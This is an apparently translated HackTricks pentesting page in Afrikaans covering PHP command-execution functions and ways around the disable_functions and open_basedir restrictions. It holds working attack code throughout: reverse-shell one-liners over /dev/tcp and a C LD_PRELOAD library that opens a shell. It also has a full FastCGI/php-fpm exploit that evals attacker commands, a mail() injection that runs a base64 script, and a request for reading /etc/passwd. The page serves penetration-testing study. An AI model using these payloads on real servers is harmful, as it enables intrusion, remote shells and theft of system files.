# PHP - Nuttige Funksies & disable_functions/open_basedir omseiling

{{#include ../../../../banners/hacktricks-training.md}}

## PHP Opdrag & Kode Uitvoering

### PHP Opdrag Uitvoering

**Let wel:** 'n [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php webshell kan **outomaties** die volgende funksie nagaan en omseil indien sommige daarvan gedeaktiveer is.

**exec** - Gee die laaste lyn van die opdragte se uitvoer
```bash
echo exec("uname  -a");
```
**passthru** - Stuur die opdragte se uitvoer direk na die blaaier
```bash
echo passthru("uname -a");
```
**stelsel** - Gee die opdragte se uitvoer direk aan die blaaier en keer die laaste lyn terug
```bash
echo system("uname -a");
```
**shell_exec** - Gee die uitvoer van opdragte terug
```bash
echo shell_exec("uname -a");
```
\`\` (backticks) - Dieselfde as shell_exec()
```bash
echo `uname -a`
```
**popen** - Maak 'n lees- of skryfpyp na die proses van 'n opdrag oop
```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```
**proc_open** - Soortgelyk aan popen() maar met 'n groter mate van beheer
```bash
proc_close(proc_open("uname -a",array(),$something));
```
**preg_replace**
```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```
**pcntl_exec** - Voer 'n program uit (per standaard in moderne en nie-so-moderne PHP moet jy die `pcntl.so` module laai om hierdie funksie te gebruik)
```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```
**mail / mb_send_mail** - Hierdie funksie word gebruik om e-posse te stuur, maar dit kan ook misbruik word om arbitrêre opdragte binne die `$options` parameter in te spuit. Dit is omdat die **php `mail` funksie** gewoonlik die `sendmail` binêre binne die stelsel aanroep en dit jou toelaat om **addisionele opsies** te plaas. Jy sal egter nie die uitvoer van die uitgevoerde opdrag kan sien nie, so dit word aanbeveel om 'n shell-skrip te skep wat die uitvoer na 'n lêer skryf, dit met mail uit te voer, en die uitvoer te druk:
```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```
**dl** - Hierdie funksie kan gebruik word om 'n PHP-uitbreiding dinamies te laai. Hierdie funksie sal nie altyd teenwoordig wees nie, so jy moet kyk of dit beskikbaar is voordat jy probeer om dit te benut. Lees [hierdie bladsy om te leer hoe om hierdie funksie te benut](disable_functions-bypass-dl-function.md).

### PHP Kode Uitvoering

Afgesien van eval is daar ander maniere om PHP-kode uit te voer: include/require kan gebruik word vir afstandkode-uitvoering in die vorm van Local File Include en Remote File Include kwesbaarhede.
```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```
## disable_functions & open_basedir

**Gedisableerde funksies** is die instelling wat in `.ini` lêers in PHP gekonfigureer kan word wat die gebruik van die aangeduide **funksies** **verbied**. **Open basedir** is die instelling wat aan PHP aandui watter vouer dit kan toegang hê.\
Die PHP instelling moet gekonfigureer word in die pad _/etc/php7/conf.d_ of soortgelyk.

Beide konfigurasies kan in die uitvoer van **`phpinfo()`** gesien word:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../images/image (493).png>)

## open_basedir Bypass

`open_basedir` sal die vouers konfigureer wat PHP kan toegang hê, jy **sal nie in staat wees om enige lêer buite** daardie vouers te skryf/lees/uit te voer nie, maar jy **sal selfs nie in staat wees om** ander gidsen te lys nie.\
As jy egter op een of ander manier in staat is om arbitrêre PHP kode uit te voer, kan jy **probeer** die volgende stuk **kode** om te probeer om die beperking te **omseil**.

### Lys gidsen met glob:// omseiling

In hierdie eerste voorbeeld word die `glob://` protokol met 'n paar pad omseilings gebruik:
```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```
**Nota1**: In die pad kan jy ook `/e??/*` gebruik om `/etc/*` en enige ander gids te lys.\
**Nota2**: Dit lyk asof 'n deel van die kode gedupliseer is, maar dit is eintlik nodig!\
**Nota3**: Hierdie voorbeeld is slegs nuttig om gidse te lys, nie om lêers te lees nie.

### Volledige open_basedir omseiling deur FastCGI te misbruik

As jy **meer oor PHP-FPM en FastCGI wil leer** kan jy die [eerste afdeling van hierdie bladsy](disable_functions-bypass-php-fpm-fastcgi.md) lees.\
As **`php-fpm`** geconfigureer is, kan jy dit misbruik om **open_basedir** heeltemal te omseil:

![](<../../../../images/image (545).png>)

![](<../../../../images/image (577).png>)

Let daarop dat die eerste ding wat jy moet doen is om te vind waar die **unix socket van php-fpm** is. Dit is gewoonlik onder `/var/run`, so jy kan **die vorige kode gebruik om die gids te lys en dit te vind**.\
Kode van [hier](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy).
```php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Doesnt do anything
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
```
Hierdie skripte sal kommunikeer met **unix socket van php-fpm** (gewoonlik geleë in /var/run as fpm gebruik word) om arbitrêre kode uit te voer. Die `open_basedir` instellings sal oorgeskryf word deur die **PHP_VALUE** attribuut wat gestuur word.\
Let op hoe `eval` gebruik word om die PHP kode wat jy binne die **cmd** parameter stuur, uit te voer.\
Let ook op die **gekommenteerde lyn 324**, jy kan dit ontkommentarieer en die **payload sal outomaties met die gegewe URL verbind en die PHP kode** wat daar bevat is, uitvoer.\
Toegang net tot `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` om die inhoud van die `/etc/passwd` lêer te kry.

> [!WARNING]
> Jy mag dalk dink dat net soos ons die `open_basedir` konfigurasie oorgeskryf het, ons ook **`disable_functions`** kan **oorgeskryf**. Wel, probeer dit, maar dit sal nie werk nie, blykbaar kan **`disable_functions` slegs in 'n `.ini` php** konfigurasie lêer gekonfigureer word en die veranderinge wat jy met PHP_VALUE maak, sal nie effektief wees op hierdie spesifieke instelling nie.

## disable_functions Bypass

As jy daarin slaag om PHP kode binne 'n masjien uit te voer, wil jy waarskynlik na die volgende vlak gaan en **arbitrêre stelselskommando's uitvoer**. In hierdie situasie is dit gewoonlik om te ontdek dat die meeste of al die PHP **funksies** wat toelaat om **stelselskommando's uit te voer, gedeaktiveer is** in **`disable_functions`.**\
Kom ons kyk hoe jy hierdie beperking kan omseil (as jy kan).

### Outomatiese omseiling ontdekking

Jy kan die hulpmiddel [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) gebruik en dit sal jou aandui watter funksie (indien enige) jy kan gebruik om **`disable_functions`** te **omseil**.

### Omseiling met ander stelselfunksies

Keer net terug na die begin van hierdie bladsy en **kyk of enige van die kommando-uitvoerende funksies nie gedeaktiveer is en beskikbaar is in die omgewing nie**. As jy net 1 van hulle vind, sal jy dit kan gebruik om arbitrêre stelselskommando's uit te voer.

### LD_PRELOAD omseiling

Dit is goed bekend dat sommige funksies in PHP soos `mail()` gaan **binaries binne die stelsel uitvoer**. Daarom kan jy hulle misbruik deur die omgewingsvariabele `LD_PRELOAD` te gebruik om hulle 'n arbitrêre biblioteek te laat laai wat enigiets kan uitvoer.

#### Funksies wat gebruik kan word om disable_functions met LD_PRELOAD te omseil

- **`mail`**
- **`mb_send_mail`**: Effektief wanneer die `php-mbstring` module geïnstalleer is.
- **`imap_mail`**: Werk as die `php-imap` module teenwoordig is.
- **`libvirt_connect`**: Vereis die `php-libvirt-php` module.
- **`gnupg_init`**: Gebruikbaar met die `php-gnupg` module geïnstalleer.
- **`new imagick()`**: Hierdie klas kan misbruik word om beperkings te omseil. Gedetailleerde uitbuitings tegnieke kan gevind word in 'n omvattende [**skrywe hier**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/).

Jy kan [**hier vind**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) die fuzzing skrip wat gebruik is om daardie funksies te vind.

Hier is 'n biblioteek wat jy kan saamstel om die `LD_PRELOAD` omgewingsvariabele te misbruik:
```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```
#### Bypass using Chankro

Om hierdie miskonfigurasie te misbruik, kan jy [**Chankro**](https://github.com/TarlogicSecurity/Chankro) gebruik. Dit is 'n hulpmiddel wat 'n **PHP exploit** sal genereer wat jy na die kwesbare bediener moet oplaai en uitvoer (toegang dit via web).\
**Chankro** sal binne die slagoffers se skyf die **biblioteek en die omgekeerde skulp** wat jy wil uitvoer, skryf en die\*\*`LD_PRELOAD` truuk + PHP `mail()`\*\* funksie gebruik om die omgekeerde skulp uit te voer.

Let daarop dat om **Chankro** te gebruik, `mail` en `putenv` **nie in die `disable_functions` lys mag verskyn nie**.\
In die volgende voorbeeld kan jy sien hoe om 'n **chankro exploit** te **skep** vir **arch 64**, wat `whoami` sal uitvoer en die uitset in _/tmp/chankro_shell.out_ sal stoor, chankro sal **die biblioteek en die payload** in _/tmp_ skryf en die **finale exploit** gaan **bicho.php** genoem word (dit is die lêer wat jy na die slagoffers se bediener moet oplaai):

{{#tabs}}
{{#tab name="shell.sh"}}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```
{{#endtab}}

{{#tab name="Chankro"}}
```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{{#endtab}}
{{#endtabs}}

As jy vind dat die **mail** funksie geblokkeer is deur gedeaktiveerde funksies, kan jy steeds die funksie **mb_send_mail** gebruik.\
Meer inligting oor hierdie tegniek en Chankro hier: [https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/)

### "Bypass" met PHP vermoëns

Let daarop dat jy met **PHP** **lêers kan lees en skryf, directories kan skep en toestemmings kan verander**.\
Jy kan selfs **databasisse dump**.\
Miskien kan jy met **PHP** die boks **enumerate** en 'n manier vind om voorregte te verhoog/opdragte uit te voer (byvoorbeeld om 'n private ssh-sleutel te lees).

Ek het 'n webshell geskep wat dit baie maklik maak om hierdie aksies uit te voer (let daarop dat die meeste webshells jou ook hierdie opsies sal bied): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### Modules/Weergawe afhanklike bypasses

Daar is verskeie maniere om disable_functions te omseil as 'n spesifieke module gebruik word of om 'n spesifieke PHP weergawe te exploiteer:

- [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable_functions-bypass-php-fpm-fastcgi.md)
- [**Bypass met FFI - Foreign Function Interface geaktiveer**](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/broken-reference/README.md)
- [**Bypass via mem**](disable_functions-bypass-via-mem.md)
- [**mod_cgi**](disable_functions-bypass-mod_cgi.md)
- [**PHP Perl Extension Safe_mode**](disable_functions-bypass-php-perl-extension-safe_mode-bypass-exploit.md)
- [**dl funksie**](disable_functions-bypass-dl-function.md)
- [**Hierdie exploit**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
- 5.\* - exploitable met klein veranderinge aan die PoC
- 7.0 - alle weergawes tot op hede
- 7.1 - alle weergawes tot op hede
- 7.2 - alle weergawes tot op hede
- 7.3 - alle weergawes tot op hede
- 7.4 - alle weergawes tot op hede
- 8.0 - alle weergawes tot op hede
- [**Van 7.0 tot 8.0 exploit (slegs Unix)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
- [**PHP 7.0=7.4 (\*nix)**](disable_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
- [**Imagick 3.3.0 PHP >= 5.4**](disable_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
- [**PHP 5.x Shellsock**](disable_functions-php-5.x-shellshock-exploit.md)
- [**PHP 5.2.4 ionCube**](disable_functions-php-5.2.4-ioncube-extension-exploit.md)
- [**PHP <= 5.2.9 Windows**](disable_functions-bypass-php-less-than-5.2.9-on-windows.md)
- [**PHP 5.2.4/5.2.5 cURL**](disable_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
- [**PHP 5.2.3 -Win32std**](disable_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
- [**PHP 5.2 FOpen exploit**](disable_functions-bypass-php-5.2-fopen-exploit.md)
- [**PHP 4 >= 4.2.-, PHP 5 pcntl_exec**](disable_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl_exec.md)

### **Outomatiese Gereedskap**

Die volgende skrip probeer sommige van die metodes wat hier bespreek is:\
[https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php)

## Ander Interessante PHP funksies

### Lys van funksies wat callbacks aanvaar

Hierdie funksies aanvaar 'n string parameter wat gebruik kan word om 'n funksie van die aanvaller se keuse aan te roep. Afhangende van die funksie mag die aanvaller al dan nie die vermoë hê om 'n parameter deur te gee. In daardie geval kan 'n Inligtingsontsluiting funksie soos phpinfo() gebruik word.

[Callbacks / Callables](https://www.php.net/manual/en/language.types.callable.php)

[Volgende lyste van hier](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```
### Inligtingsontsluiting

Meeste van hierdie funksie-oproepe is nie sinkholes nie. Maar dit kan eerder 'n kwesbaarheid wees as enige van die data wat teruggestuur word, deur 'n aanvaller gesien kan word. As 'n aanvaller phpinfo() kan sien, is dit beslis 'n kwesbaarheid.
```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```
### Ander
```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```
### Lêerstelsel Funksies

Volgens RATS is alle lêerstelsel funksies in php sleg. Sommige hiervan lyk nie baie nuttig vir die aanvaller nie. Ander is nuttiger as wat jy dalk dink. Byvoorbeeld, as allow_url_fopen=On is, kan 'n url as 'n lêer pad gebruik word, so 'n oproep na copy($\_GET\['s'], $\_GET\['d']); kan gebruik word om 'n PHP-skrip enige plek op die stelsel op te laai. Ook, as 'n webwerf kwesbaar is vir 'n versoek wat via GET gestuur word, kan elkeen van daardie lêerstelsel funksies misbruik word om 'n aanval na 'n ander gasheer deur jou bediener te kan lei.

**Oop lêerstelsel handler**
```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```
**Skryf na lêerstelsel (gedeeltelik in kombinasie met lees)**
```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```
**Lees van die lêerstelsel**
```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```
{{#include ../../../../banners/hacktricks-training.md}}
